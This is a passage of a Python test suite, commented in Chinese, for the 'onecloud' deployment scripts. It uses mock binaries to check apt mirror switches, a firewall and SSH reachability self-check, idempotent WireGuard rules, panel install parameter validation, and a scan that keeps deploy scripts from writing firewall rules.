    unset ONECLOUD_APT_ENABLE_MIRROR ONECLOUD_APT_ENABLE_UPDATE
    unset ONECLOUD_APT_ENABLE_UPGRADE ONECLOUD_APT_SKIP_MIRROR
    unset ONECLOUD_APT_SKIP_PKGS ONECLOUD_APT_SKIP_ALL
    local kv
    for kv in "$@"; do
        case "$kv" in ONECLOUD_*) export "$kv" ;; esac
    done
    apt_switch_defaults
    for kv in "$@"; do
        case "$kv" in DO_*|APT_*) export "$kv" ;; esac
    done
    apt_switch_fixup

    ( set -e; step_apt_flow ) > "$WORK/out_$tag.txt" 2>&1
    echo "###RC:$tag:$?"
    echo "###APTLOG_BEGIN:$tag"
    cat "$APT_LOG"
    echo "###APTLOG_END:$tag"
    echo "###SOURCES_BEGIN:$tag"
    cat "$root/apt/sources.list"
    echo "###SOURCES_END:$tag"
    echo "###OUT_BEGIN:$tag"
    cat "$WORK/out_$tag.txt"
    echo "###OUT_END:$tag"
}

run_case a1_default
run_case a2_mirror_only        DO_MIRROR=true
run_case a3_mirror_no_update   DO_MIRROR=true APT_UPDATE_EXPLICIT=true
run_case a4_update_only        DO_APT_UPDATE=true
run_case a5_upgrade_only       DO_APT_UPGRADE=true
run_case a6_no_pkgs            DO_APT_PKGS=false
run_case a7_all_off            DO_APT_PKGS=false DO_APT_UPDATE=false DO_APT_UPGRADE=false DO_MIRROR=false
run_case a8_legacy_env         ONECLOUD_APT_ENABLE_MIRROR=1 ONECLOUD_APT_SKIP_MIRROR=1
run_case a9_env_enable         ONECLOUD_APT_ENABLE_MIRROR=1 ONECLOUD_APT_ENABLE_UPDATE=1
echo "###DONE"
"""
    probe = tmpdir / "probe.sh"
    probe.write_text(
        helpers + "\n\nstep_apt_flow() {\n" + flow + "\n}\n" + driver
        .replace("@WORK@", _posix(tmpdir))
        .replace("@MOCK@", _posix(mockbin)),
        encoding="utf-8", newline="\n")

    try:
        r = subprocess.run(["bash", _posix(probe)], capture_output=True, text=True,
                           encoding="utf-8", errors="replace",
                           stdin=subprocess.DEVNULL, timeout=420)
        out = r.stdout

        def sect(name, tag):
            m = re.search(rf"###{name}_BEGIN:{tag}\n(.*?)\n###{name}_END:{tag}", out, re.S)
            return (m.group(1) + "\n") if m else ""

        def rc(tag):
            m = re.search(rf"###RC:{tag}:(\d+)", out)
            return int(m.group(1)) if m else None

        if "###DONE" not in out:
            log_fail("mock 驱动未跑完", f"stderr={r.stderr[-300:]}")
            return

        # a1: 默认 —— 一个 apt 动作都不该有源改动, 只装基础工具
        a1 = sect("APTLOG", "a1_default")
        s1 = sect("SOURCES", "a1_default")
        if rc("a1_default") == 0:
            log_pass("默认组合下初始化正常退出")
        else:
            log_fail(f"默认组合退出码 {rc('a1_default')}")
        if "update" not in a1 and "upgrade" not in a1:
            log_pass("默认不刷新索引、不升级系统 (这是本次改动的核心)")
        else:
            log_fail("默认仍在执行 update/upgrade", a1[:200])
        if "apt install -y" in a1:
            log_pass("默认仍会安装基础工具")
        else:
            log_fail("默认跳过了基础工具安装")
        if "bookworm main" in s1 and "onecloud" not in s1:
            log_pass("默认完全不改写 apt 源文件")
        else:
            log_fail("默认仍改写了源文件", s1[:200])
        if "换源: 跳过" in sect("OUT", "a1_default"):
            log_pass("输出里明确标注「换源: 跳过」")
        else:
            log_fail("未标注换源被跳过")

        # a2: 只开换源 -> 必须自动补刷索引, 但不升级
        a2 = sect("APTLOG", "a2_mirror_only")
        s2 = sect("SOURCES", "a2_mirror_only")
        if "bookworm" in s2 and "mirrors.tuna" in s2:
            log_pass("--mirror 时按系统代号写入国内源")
        else:
            log_fail("--mirror 未写入源", s2[:200])
        if "apt update" in a2 and "apt upgrade" not in a2:
            log_pass("换源后自动补刷索引, 但不顺手升级系统包")
        else:
            log_fail("换源后的联动不正确", a2[:200])
        if "自动补" in sect("OUT", "a2_mirror_only"):
            log_pass("自动补的刷索在日志里被说明 (不是悄悄执行)")
        else:
            log_fail("自动补刷索引未说明原因")

        # a3: 显式否决刷索引 -> 不自动补 (尊重显式指定)
        a3 = sect("APTLOG", "a3_mirror_no_update")
        if "update" not in a3 and "upgrade" not in a3:
            log_pass("显式否决刷索引时不做任何 apt 动作 (显式优先)")
        else:
            log_fail("显式否决仍被执行", a3[:200])

        # a4/a5: 只刷索引 / 只升级
        a4 = sect("APTLOG", "a4_update_only")
        if "apt update" in a4 and "apt upgrade" not in a4:
            log_pass("--apt-update 只刷索引, 不升级")
        else:
            log_fail("--apt-update 行为不正确", a4[:200])
        a5 = sect("APTLOG", "a5_upgrade_only")
        if "apt upgrade" in a5 and "apt update" not in a5:
            log_pass("--apt-upgrade 只升级, 不额外刷索引")
        else:
            log_fail("--apt-upgrade 行为不正确", a5[:200])

        # a6/a7: 跳过装包 / 全关
        a6 = sect("APTLOG", "a6_no_pkgs")
        if "apt install -y" not in a6 and "update" not in a6:
            log_pass("--no-apt-pkgs 时不再安装基础工具")
        else:
            log_fail("--no-apt-pkgs 未生效", a6[:200])
        a7 = sect("APTLOG", "a7_all_off")
        if a7.strip() == "":
            log_pass("四项全关时 apt 一次都没被调用 (纯离线初始化)")
        else:
            log_fail("四项全关仍调用了 apt", a7[:200])

        # a8: 旧开关 ONECLOUD_APT_SKIP_MIRROR 仍能压住新开关
        s8 = sect("SOURCES", "a8_legacy_env")
        if "onecloud" not in s8 and "bookworm main" in s8:
            log_pass("旧开关 ONECLOUD_APT_SKIP_MIRROR=1 仍能阻止换源")
        else:
            log_fail("旧开关失效", s8[:200])

        # a9: 环境变量启用换源+刷索引
        s9 = sect("SOURCES", "a9_env_enable")
        a9 = sect("APTLOG", "a9_env_enable")
        if "mirrors.tuna" in s9 and "apt update" in a9:
            log_pass("ONECLOUD_APT_ENABLE_MIRROR/UPDATE 环境变量生效")
        else:
            log_fail("环境变量开关未生效", (s9[:120] + a9[:120]))
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


# ============ 测试25: 防火墙 / SSH 通道自检 ============
def test_network_audit():
    """测试 25: 网络通路 / 防火墙 / SSH 通道自检

    背景: 本仓库脚本不主动改防火墙 (wg0.conf 的 PostUp/PostDown 规则自
    v1.4.5 起默认关闭, 改由 setup_firewall.sh 统一管理), 但现场真正把人
    挡在门外的是别的: INPUT 策略 DROP 却没放行 SSH、ufw 启用后没放行、
    Docker 把 FORWARD 置 DROP 打断 wg 转发、以及通过 SSH 远端改静态 IP
    把自己的连接改断。
    """
    print("\n" + "=" * 60)
    print("测试 25: 防火墙与 SSH 通道自检")
    print("=" * 60)

    lib = SCRIPTS_DIR / "lib-network-audit.sh"
    boot = SCRIPTS_DIR / "bootstrap.sh"
    wg = SCRIPTS_DIR / "wireguard-setup.sh"
    gk = PROJECT_ROOT / "node-wk-edge-01" / "wireguard" / "generate-keys.sh"
    missing = [str(p) for p in (lib, boot, wg, gk) if not p.exists()]
    if missing:
        log_fail(f"必要文件缺失: {missing}")
        return

    src = boot.read_text(encoding="utf-8")
    wsrc = wg.read_text(encoding="utf-8")
    gsrc = gk.read_text(encoding="utf-8")

    # ---- 1) 静态检查: bootstrap 集成与断链防护 ----
    if "lib-network-audit.sh" in src and "net_audit_report" in src:
        log_pass("bootstrap 接入通路自检库并在启动时输出报告")
    else:
        log_fail("bootstrap 未接入自检库")

    if "net_audit_is_ssh" in src and "会立即断开这条连接" in src:
        log_pass("SSH 会话中变更 IP 会明确告警「连接将断开」")
    else:
        log_fail("未检测 SSH 会话风险", "远端改 IP 会当场失联且无提示")

    if "net-backup-" in src and "net-config.tar" in src:
        log_pass("改写网络配置前先打快照 (含 netplan / interfaces)")
    else:
        log_fail("改写前没有备份", "配置出错无法回退")

    if "netplan generate" in src:
        log_pass("netplan 配置先校验再生效 (校验不过不 apply)")
    else:
        log_fail("netplan 未做语法校验", "写坏配置会直接 apply")

    if not re.search(r"iptables\s+-(A|I|D|P|F|X)\b", src):
        log_pass("bootstrap 自身不写 iptables (只在自检里只读)")
    else:
        log_fail("bootstrap 里出现会改防火墙的命令", "改网络配置时动防火墙极易把自己挡在外面")

    # ---- 2) 静态检查: WireGuard 规则不再写死网卡且幂等 ----
    if "-o eth0" in wsrc or "-o eth0" in gsrc:
        log_fail("wg0.conf 的 MASQUERADE 仍写死 eth0",
                 "玩客云可能是 end0, NAT 会静默失效")
    else:
        log_pass("MASQUERADE 不再写死 eth0")

    if "iptables -C" in wsrc or "-C FORWARD" in wsrc:
        log_pass("wireguard 规则用 -C 探测后再添加 (重复 up 不堆叠)")
    else:
        log_fail("wireguard 规则仍是无条件 -A", "反复 up 会堆叠残留规则")

    if "WG_IF" in wsrc and "WG_EGRESS_IF" in gsrc:
        log_pass("出网网卡在节点侧探测 (控制端生成 + 节点本地生成两条路都覆盖)")
    else:
        log_fail("出网网卡探测缺失")

    # ---- 3) 行为验证: 自检函数在受控环境下判定 ----
    tmpdir = Path(tempfile.mkdtemp(prefix="oc_t25_"))
    mockbin = tmpdir / "mockbin"
    mockbin.mkdir()

    def _posix(p):
        s = Path(p).as_posix()
        m = re.match(r"^([A-Za-z]):/(.*)$", s)
        return f"/{m.group(1).lower()}/{m.group(2)}" if m else s

    mocks = {
        "iptables": r"""#!/bin/bash
# 支持 -S / -P / -C / -A / -D 的最小实现; -C 命中已存在规则时返回 0
LOG="${IPT_LOG:-/dev/null}"
STATE="${IPT_STATE:-/dev/null}"
tbl="filter"
while [ $# -gt 0 ]; do
    case "$1" in
        -t) tbl="$2"; shift 2 ;;
        -C|-A|-D|-I|-S|-P) break ;;
        *) shift ;;
    esac
done
op="${1:-}"; shift || true
if [ "$op" = "-S" ]; then
    chain="${1:-}"
    if [ -n "$chain" ]; then
        # 指定链: 只回该链的策略 (net_audit_policy 按链读取)
        eval "pol=\${MOCK_POL_$chain:-ACCEPT}"
        echo "-P $chain $pol"
        if [ "$chain" = "INPUT" ] && [ -n "${MOCK_S_INPUT_RULES:-}" ]; then
            printf '%s\n' "$MOCK_S_INPUT_RULES"
        fi
        exit 0
    fi
    echo "-P INPUT ${MOCK_POL_INPUT:-ACCEPT}"
    echo "-P FORWARD ${MOCK_POL_FORWARD:-ACCEPT}"
    echo "-P OUTPUT ACCEPT"
    exit 0
fi
key="$tbl $*"
echo "iptables[$tbl] $op $*" >> "$LOG"
case "$op" in
    -C) grep -qxF "$key" "$STATE" 2>/dev/null && exit 0; exit 1 ;;
    -A|-I) echo "$key" >> "$STATE"; exit 0 ;;
    -D)
        grep -vxF "$key" "$STATE" > "${STATE}.tmp" 2>/dev/null || true
        mv "${STATE}.tmp" "$STATE" 2>/dev/null || true
        exit 0 ;;
    -P) exit 0 ;;
esac
exit 0
""",
        "ss": r"""#!/bin/bash
echo "LISTEN 0 128 0.0.0.0:${MOCK_SSH_PORT:-22} 0.0.0.0:* users:(("sshd",pid=1,fd=3))"
exit 0
""",
        "ufw": r"""#!/bin/bash
case "$1" in
    status)
        if [ "${MOCK_UFW_ACTIVE:-0}" = "1" ]; then
            echo "Status: active"
            [ -n "${MOCK_UFW_ALLOW:-}" ] && printf '%s\n' "$MOCK_UFW_ALLOW"
            echo ""
            echo "To                         Action      From"
            echo "--                         ------      ----"
        else
            echo "Status: inactive"
        fi
        exit 0 ;;
esac
exit 0
""",
        "ip": r"""#!/bin/bash
# 默认路由与地址查询: 只覆盖自检用到的两种
case "$*" in
    *"route show default"*)
        echo "${MOCK_DEFAULT_ROUTE:-default via 192.168.1.1 dev end0 proto dhcp metric 100}"
        exit 0 ;;
    *"addr show"*)
        # 贴近 iproute2 真实输出: 第 4 列是地址/前缀
        echo "2: eth0    inet ${MOCK_LOCAL_ADDR:-192.168.1.101/24} brd 192.168.1.255 scope global eth0"
        exit 0 ;;
esac
exit 0
""",
    }
    for name, body in mocks.items():
        p = mockbin / name
        p.write_text(body, encoding="utf-8", newline="\n")
        os.chmod(p, 0o755)

    driver = r"""
# ---------------- driver ----------------
set +e
M="@MOCK@"
LIB="@LIB@"
WORK="@WORK@"
PATH="$M:/usr/bin:/bin"
export PATH
log_info()  { echo "[INFO] $*"; }
log_warn()  { echo "[WARN] $*"; }
log_error() { echo "[ERROR] $*"; }
# shellcheck disable=SC1090
. "$LIB"

export IPT_STATE="$WORK/ipt.rules"
export IPT_LOG="$WORK/ipt.log"
: > "$IPT_STATE"; : > "$IPT_LOG"

case_run() {
    local tag="$1"; shift
    unset SSH_CONNECTION SSH_CLIENT MOCK_POL_INPUT MOCK_POL_FORWARD MOCK_S_INPUT_RULES
    unset MOCK_UFW_ACTIVE MOCK_UFW_ALLOW MOCK_SSH_PORT MOCK_DEFAULT_ROUTE
    local kv
    for kv in "$@"; do export "$kv"; done
    echo "###CASE:$tag"
    echo "  backend=$(net_audit_backend)"
    echo "  input_pol=$(net_audit_policy INPUT)"
    echo "  forward_pol=$(net_audit_policy FORWARD)"
    echo "  ssh_ports=$(net_audit_ssh_ports | tr '\n' ' ')"
    if net_audit_ssh_allowed; then echo "  ssh_allowed=yes"; else echo "  ssh_allowed=no"; fi
    echo "  is_ssh=$(net_audit_is_ssh && echo yes || echo no)"
    echo "  egress=$(net_audit_egress_if || echo none)"
    if net_audit_report > "$WORK/rep_$tag.txt" 2>&1; then
        echo "  report=clean"
    else
        echo "  report=risk"
    fi
    echo "###REPORT_BEGIN:$tag"
    cat "$WORK/rep_$tag.txt"
    echo "###REPORT_END:$tag"
}

case_run c1_no_firewall
case_run c2_drop_no_ssh      MOCK_POL_INPUT=DROP
case_run c3_drop_with_ssh    MOCK_POL_INPUT=DROP MOCK_S_INPUT_RULES="-A INPUT -p tcp --dport 22 -j ACCEPT"
case_run c4_ufw_blocked      MOCK_UFW_ACTIVE=1
case_run c5_ufw_allowed      MOCK_UFW_ACTIVE=1 MOCK_UFW_ALLOW="22/tcp                     ALLOW       Anywhere"
case_run c6_fwd_drop         MOCK_POL_FORWARD=DROP
case_run c7_ssh_session      SSH_CONNECTION="192.168.1.50 51234 192.168.1.101 22"
case_run c8_custom_port      MOCK_SSH_PORT=2222 MOCK_POL_INPUT=DROP MOCK_S_INPUT_RULES="-A INPUT -p tcp --dport 2222 -j ACCEPT"
echo "###DONE"
"""
    probe = tmpdir / "probe.sh"
    probe.write_text(driver.replace("@MOCK@", _posix(mockbin))
                           .replace("@LIB@", _posix(lib))
                           .replace("@WORK@", _posix(tmpdir)),
                     encoding="utf-8", newline="\n")

    try:
        r = subprocess.run(["bash", _posix(probe)], capture_output=True, text=True,
                           encoding="utf-8", errors="replace",
                           stdin=subprocess.DEVNULL, timeout=HARNESS_TIMEOUT)
        out = r.stdout

        def case_block(tag):
            m = re.search(rf"###CASE:{tag}\n(.*?)(?=###CASE:|###DONE)", out, re.S)
            return m.group(1) if m else ""

        def report(tag):
            m = re.search(rf"###REPORT_BEGIN:{tag}\n(.*?)\n###REPORT_END:{tag}", out, re.S)
            return (m.group(1) + "\n") if m else ""

        if "###DONE" not in out:
            log_fail("自检驱动未跑完", f"stderr={r.stderr[-300:]}")
            return

        c1 = case_block("c1_no_firewall")
        if "backend=none" in c1 and "ssh_allowed=yes" in c1 and "report=clean" in c1:
            log_pass("无防火墙时判定为安全 (不误报)")
        else:
            log_fail("无防火墙场景判定错误", c1[:200])

        c2 = case_block("c2_drop_no_ssh")
        if "input_pol=DROP" in c2 and "ssh_allowed=no" in c2 and "report=risk" in c2:
            log_pass("INPUT 策略 DROP 且未放行 SSH -> 判为高危")
        else:
            log_fail("漏判 INPUT DROP 未放行 SSH", c2[:200])
        if "高危" in report("c2_drop_no_ssh") and "--dport 22" in report("c2_drop_no_ssh"):
            log_pass("报告里给出高危说明与放行命令")
        else:
            log_fail("报告缺少可执行的放行建议")

        c3 = case_block("c3_drop_with_ssh")
        if "ssh_allowed=yes" in c3 and "report=clean" in c3:
            log_pass("INPUT DROP 但已放行 22 -> 不误报")
        else:
            log_fail("已放行 SSH 仍被判风险", c3[:200])

        c4 = case_block("c4_ufw_blocked")
        if "backend=ufw" in c4 and "ssh_allowed=no" in c4:
            log_pass("ufw 启用且未放行 SSH -> 判为高危")
        else:
            log_fail("ufw 未放行 SSH 漏判", c4[:200])

        c5 = case_block("c5_ufw_allowed")
        if "ssh_allowed=yes" in c5:
            log_pass("ufw 已放行 22/tcp -> 不误报")
        else:
            log_fail("ufw 已放行仍误报", c5[:200])

        c6 = case_block("c6_fwd_drop")
        if "forward_pol=DROP" in c6 and "report=risk" in c6:
            log_pass("FORWARD 策略 DROP -> 在报告里点出转发受影响")
        else:
            log_fail("FORWARD DROP 未被识别", c6[:200])

        c7 = case_block("c7_ssh_session")
        if "is_ssh=yes" in c7 and "SSH 远程 (来自 192.168.1.50)" in report("c7_ssh_session"):
            log_pass("SSH 会话被正确识别并标出来源 IP")
        else:
            log_fail("SSH 会话识别失败", c7[:200])

        c8 = case_block("c8_custom_port")
        if "2222" in c8 and "ssh_allowed=yes" in c8:
            log_pass("sshd 非 22 端口时按实际端口判定放行")
        else:
            log_fail("非默认 SSH 端口判定错误", c8[:200])

        if "egress=end0" in c1:
            log_pass("默认路由出口网卡取到 end0 (不假设 eth0)")
        else:
            log_fail("出口网卡探测错误", c1[:200])

        # 4) 行为验证: 生成的 PostUp 在节点上幂等
        # 在临时副本里生成 (不往仓库里写密钥与 wg0.conf)
        gk_root = tmpdir / "wgtest"
        (gk_root / "scripts").mkdir(parents=True)
        (gk_root / "inventory").mkdir(parents=True)
        for f in SCRIPTS_DIR.glob("*.sh"):
            shutil.copy2(f, gk_root / "scripts" / f.name)
        for f in (PROJECT_ROOT / "inventory").glob("*.yaml"):
            shutil.copy2(f, gk_root / "inventory" / f.name)
        mock_wg = mockbin / "wg"
        mock_wg.write_text(r"""#!/bin/bash
case "$1" in
    genkey) echo "PRIV_TEST_KEY" ;;
    pubkey) cat >/dev/null; echo "PUB_TEST_KEY" ;;
esac
exit 0
""", encoding="utf-8", newline="\n")
        os.chmod(mock_wg, 0o755)

        env_g = dict(os.environ)
        env_g["PATH"] = f"{_posix(mockbin)}:/usr/bin:/bin"
        # 2026-09-15 起 wg0.conf 默认**不**写 PostUp/PostDown（防火墙统一交给
        # setup_firewall.sh）。这里要验证的是那段规则本身的正确性，所以显式打开开关
        # 把它取出来 —— 默认关闭的行为由测试 27 负责断言。
        env_g["ONECLOUD_WG_FIREWALL"] = "1"
        subprocess.run(["bash", "scripts/wireguard-setup.sh"], cwd=str(gk_root),
                       capture_output=True, env=env_g, timeout=HARNESS_TIMEOUT)
        conf = gk_root / "node-wk-edge-01" / "wireguard" / "wg0.conf"
        if not conf.exists():
            log_fail("临时副本里未生成 wg0.conf", str(conf))
        else:
            post_up = ""
            for line in conf.read_text(encoding="utf-8").splitlines():
                if line.startswith("PostUp"):
                    post_up = line.split("=", 1)[1].strip()
                    break
            if not post_up:
                log_fail("ONECLOUD_WG_FIREWALL=1 时 wg0.conf 仍未生成 PostUp 行")
            else:
                env = dict(os.environ)
                env["PATH"] = f"{_posix(mockbin)}:/usr/bin:/bin"
                env["IPT_STATE"] = _posix(tmpdir / "run.rules")
                env["IPT_LOG"] = _posix(tmpdir / "run.log")
                env["MOCK_DEFAULT_ROUTE"] = "default via 192.168.1.1 dev end0 proto dhcp"
                Path(tmpdir / "run.rules").write_text("", encoding="utf-8")
                Path(tmpdir / "run.log").write_text("", encoding="utf-8")
                # 模拟 wg-quick 的执行方式 (bash -c), 连跑两次
                subprocess.run(["bash", "-c", post_up], capture_output=True, env=env, timeout=60)
                log1 = Path(tmpdir / "run.log").read_text(encoding="utf-8")
                subprocess.run(["bash", "-c", post_up], capture_output=True, env=env, timeout=60)
                log2 = Path(tmpdir / "run.log").read_text(encoding="utf-8")

                if "-o end0" in log1:
                    log_pass("PostUp 在节点上按实际出口网卡 end0 做 MASQUERADE")
                else:
                    log_fail("PostUp 未取到实际出口网卡", log1[:200])
                if log1.count("-A FORWARD -i wg0 -j ACCEPT") == 1:
                    log_pass("首次执行添加转发规则")
                else:
                    log_fail("首次执行未添加规则", log1[:200])
                n_add_first = log1.count("-A FORWARD")
                n_add_total = log2.count("-A FORWARD")
                if n_add_total == n_add_first:
                    log_pass("重复执行不再堆叠规则 (-C 命中后跳过 -A)")
                else:
                    log_fail(f"规则重复堆叠: 第一次 {n_add_first} 次, 两次共 {n_add_total} 次")
                if "-C INPUT -p udp --dport 51820" in log1:
                    log_pass("入站放行同样先探测再添加")
                else:
                    log_fail("INPUT 规则未做幂等处理")
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


# ============ 测试26: 面板安装参数 (IP/端口/监听端口) ============
def test_panel_install_params():
    """测试 26: panel/install-service.sh 可设置面板 IP / 端口 / 监听端口

    三个概念刻意分开:
      监听地址 (bind 到哪张网卡) / 监听端口 (bind 到哪个端口) /
      访问地址 (浏览器里敲的面板 IP 或域名) —— 反代、NAT、SSH 转发都会
      让"访问"与"监听"不一致, 因此访问端口可单独指定。
    """
    print("\n" + "=" * 60)
    print("测试 26: 面板安装参数 (监听地址 / 监听端口 / 访问地址)")
    print("=" * 60)

    script = PANEL_DIR / "install-service.sh"
    if not script.exists():
        log_fail("panel/install-service.sh 缺失")
        return
    src = script.read_text(encoding="utf-8")

    # ---- 1) 静态检查 ----
    for opt in ["--host", "--port", "--url-host", "--url-port", "--yes"]:
        if opt not in src:
            log_fail(f"缺少选项 {opt}")
            break
    else:
        log_pass("提供 --host / --port / --url-host / --url-port / --yes")

    if "panel_env_set" in src:
        log_pass("参数写入面板环境文件")
    else:
        log_fail("参数没有落到 panel.env")

    if "EnvironmentFile=-" in src:
        log_pass("unit 引用 EnvironmentFile (文件缺失也不报错)")
    else:
        log_fail("unit 未引用环境文件")

    if "grep -v" in src and "PANEL_USER" not in src.split("panel_env_set")[1][:400]:
        log_pass("环境文件是合并写入 (不会冲掉账号密码)")
    else:
        log_warn("无法确认环境文件为合并写入")

    if "ONECLOUD_PANEL_TTY" in src:
        log_pass("交互开关可强制 (便于演练与自动化测试)")
    else:
        log_fail("交互分支无法在非 TTY 下演练")

    # ---- 2) 行为验证: mock systemctl + 临时 unit/env 路径 ----
    tmpdir = Path(tempfile.mkdtemp(prefix="oc_t26_"))
    mockbin = tmpdir / "mockbin"
    mockbin.mkdir()
    sc = mockbin / "systemctl"
    sc.write_text("#!/bin/bash\necho \"systemctl $*\" >> \"$SC_LOG\"\nexit 0\n",
                  encoding="utf-8", newline="\n")
    os.chmod(sc, 0o755)

    def _posix(p):
        s = Path(p).as_posix()
        m = re.match(r"^([A-Za-z]):/(.*)$", s)
        return f"/{m.group(1).lower()}/{m.group(2)}" if m else s

    unit = tmpdir / "onecloud-panel.service"
    envf = tmpdir / "etc" / "onecloud" / "panel.env"

    def run_inst(args, stdin_data=None, env_extra=None):
        env = dict(os.environ)
        env["PATH"] = f"{_posix(mockbin)}:/usr/bin:/bin"
        env["ONECLOUD_PANEL_UNIT"] = _posix(unit)
        env["ONECLOUD_PANEL_ENV_FILE"] = _posix(envf)
        env["SC_LOG"] = _posix(tmpdir / "sc.log")
        for k in ("PANEL_HOST", "PANEL_PORT", "PANEL_URL_HOST", "PANEL_URL_PORT",
                  "ONECLOUD_PANEL_TTY"):
            env.pop(k, None)
        if env_extra:
            env.update(env_extra)
        kwargs = dict(capture_output=True, env=env, cwd=str(PROJECT_ROOT), timeout=120)
        if stdin_data is None:
            kwargs["stdin"] = subprocess.DEVNULL
        else:
            kwargs["input"] = stdin_data.encode("utf-8")
        r = subprocess.run(["bash", "panel/install-service.sh"] + args, **kwargs)
        return (r.returncode,
                r.stdout.decode("utf-8", "replace"),
                r.stderr.decode("utf-8", "replace"))

    def unit_env():
        if not unit.exists():
            return {}
        out = {}
        for line in unit.read_text(encoding="utf-8").splitlines():
            if line.startswith("Environment=PANEL_"):
                k, v = line.split("=", 1)[1].split("=", 1)
                out[k] = v
        return out

    try:
        # 参数路径
        rc, out, err = run_inst(["--host", "192.168.1.101", "--port", "9100",
                                 "--url-host", "panel.example.com",
                                 "--url-port", "19000"])
        ue = unit_env()
        if rc == 0 and ue.get("PANEL_HOST") == "192.168.1.101" and ue.get("PANEL_PORT") == "9100":
            log_pass("--host/--port 生效并写入 unit")
        else:
            log_fail(f"参数未生效 (rc={rc})", str(ue)[:200])
        if "http://panel.example.com:19000" in out and "经反代/NAT" in out:
            log_pass("访问地址与监听值不同时给出对外入口说明")
        else:
            log_fail("访问入口回显不正确", out[-200:])
        if envf.exists() and "PANEL_URL_PORT=19000" in envf.read_text(encoding="utf-8"):
            log_pass("访问参数落到 panel.env")
        else:
            log_fail("访问参数未落盘")

        # 非法监听地址: 网段地址 / 回环网段网络地址 / 组播
        for bad, expect in [("192.168.1.0", "网络地址"),
                            ("127.0.0.0", "回环网段"),
                            ("224.0.0.1", "组播")]:
            rc, out, err = run_inst(["--host", bad])
            if rc != 0 and expect in (out + err):
                log_pass(f"拒绝监听地址 {bad} 并说明原因 ({expect})")
            else:
                log_fail(f"未拒绝非法监听地址 {bad} (rc={rc})")

        # 非法端口 / 访问地址
        for args, label in [(["--port", "70000"], "端口超范围"),
                            (["--port", "abc"], "端口非数字"),
                            (["--url-host", "192.168.1.999"], "访问地址非法")]:
            rc, out, err = run_inst(args)
            if rc != 0 and "ERROR" in (out + err):
                log_pass(f"拒绝非法参数: {label}")
            else:
                log_fail(f"未拒绝非法参数: {label} (rc={rc})")

        # 环境变量注入 + --yes: 不应再询问
        rc, out, err = run_inst(["--yes"], env_extra={"PANEL_HOST": "127.0.0.1",
                                                     "PANEL_PORT": "9101"})
        ue = unit_env()
        if rc == 0 and ue.get("PANEL_HOST") == "127.0.0.1" and ue.get("PANEL_PORT") == "9101" \
                and "回车=" not in out:
            log_pass("env 注入 + --yes 时不询问 (init.sh 调用路径)")
        else:
            log_fail(f"env 注入路径异常 (rc={rc})", (out + err)[-200:])

        # 环境文件合并: 已有账号密码必须保留
        envf.parent.mkdir(parents=True, exist_ok=True)
        envf.write_text("PANEL_USER=admin\nPANEL_PASS=s3cret\nPANEL_HOST=0.0.0.0\n",
                        encoding="utf-8")
        rc, out, err = run_inst(["--host", "192.168.1.102", "--port", "9000", "-y"])
        content = envf.read_text(encoding="utf-8") if envf.exists() else ""
        if "PANEL_USER=admin" in content and "PANEL_PASS=s3cret" in content \
                and "PANEL_HOST=192.168.1.102" in content:
            log_pass("改写 panel.env 时保留账号密码, 只更新自己负责的键")
        else:
            log_fail("panel.env 被整份覆盖", content[:200])

        # 交互: 直接回车 = 默认值 0.0.0.0:9000
        rc, out, err = run_inst([], stdin_data="\n\n\n",
                                env_extra={"ONECLOUD_PANEL_TTY": "1"})
        ue = unit_env()
        if rc == 0 and ue.get("PANEL_HOST") == "0.0.0.0" and ue.get("PANEL_PORT") == "9000":
            log_pass("交互直接回车 = 默认 0.0.0.0:9000")
        else:
            log_fail(f"交互默认值异常 (rc={rc})", str(ue)[:200])

        # 交互: 非法值被拒后重新询问
        rc, out, err = run_inst([], stdin_data="192.168.1.0\n192.168.1.101\n9000\n\n\n",
                                env_extra={"ONECLOUD_PANEL_TTY": "1"})
        ue = unit_env()
        if rc == 0 and ue.get("PANEL_HOST") == "192.168.1.101" and "网络地址" in (out + err):
            log_pass("交互时非法监听地址被拒并要求重新输入")
        else:
            log_fail(f"交互拒绝非法值失败 (rc={rc})", str(ue)[:200])
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


def test_deploy_no_firewall():
    """测试 27: 部署脚本零防火墙写入 + 防火墙建议清单生成

    约定 (2026-09-15):
      1. onecloud 的部署脚本**不改节点防火墙** —— 不写 iptables/ip6tables,
         不下发 ufw / firewall-cmd / nft, 生成的 wg0.conf 默认也不带
         PostUp/PostDown 规则;
      2. 节点部署完毕后生成一份「防火墙设置建议清单」(docs/firewall/<节点>.txt),
         清单里的 DSL 行可直接录入 setup_firewall.sh;
      3. 真正调整防火墙的唯一入口是人手动执行 setup_firewall.sh。
    """
    print("\n" + "=" * 60)
    print("测试 27: 部署零防火墙改动 + 防火墙建议清单")
    print("=" * 60)

    rec = SCRIPTS_DIR / "firewall-recommend.sh"
    dep = SCRIPTS_DIR / "deploy.sh"
    wg = SCRIPTS_DIR / "wireguard-setup.sh"
    gk = PROJECT_ROOT / "node-wk-edge-01" / "wireguard" / "generate-keys.sh"
    init_sh = PROJECT_ROOT / "init" / "init.sh"
    missing = [str(p) for p in (rec, dep, wg, gk, init_sh) if not p.exists()]
    if missing:
        log_fail(f"必要文件缺失: {missing}")
        return

    # ---------------- A) 静态: 部署侧不出现"会写入"的防火墙命令 ----------------
    # 判定: 去掉注释与 heredoc 正文后, 以防火墙命令开头且带写动作的行 = 违规。
    #       (firewall-recommend.sh 的 heredoc 里是给人看的示例命令, 不算执行)
    fw_bin_re = re.compile(r"^(?:sudo\s+)?(iptables|ip6tables|nft|ufw|firewall-cmd)\b")
    fw_write_re = re.compile(
        r"(?<![-\w])(-A|-I|-D|-P|-F|-X|-N|-R)\b"
        r"|(?<![-\w])(add|delete|flush|allow|deny|enable|disable|reload)\b"
        r"|--(?:add|remove|permanent|reload|set-default-zone)"
    )

    def _executable_lines(path):
        """粗略取出"会真正执行"的行: 跳过注释与 heredoc 正文。"""
        out, heredoc = [], None
        for raw in path.read_text(encoding="utf-8", errors="replace").splitlines():
            if heredoc is not None:
                if raw.strip() == heredoc:
                    heredoc = None
                continue
            s = raw.strip()
            if not s or s.startswith("#"):
                continue
            m = re.search(r"<<-?\s*[\"']?([A-Za-z_][A-Za-z0-9_]*)[\"']?", raw)
            if m:
                heredoc = m.group(1)
            out.append(raw)
        return out

    scan_files = sorted(SCRIPTS_DIR.glob("*.sh")) + [init_sh, gk]
    offenders = []
    for f in scan_files:
        for ln, line in enumerate(_executable_lines(f), 1):
            s = line.strip()
            if not fw_bin_re.match(s):
                continue
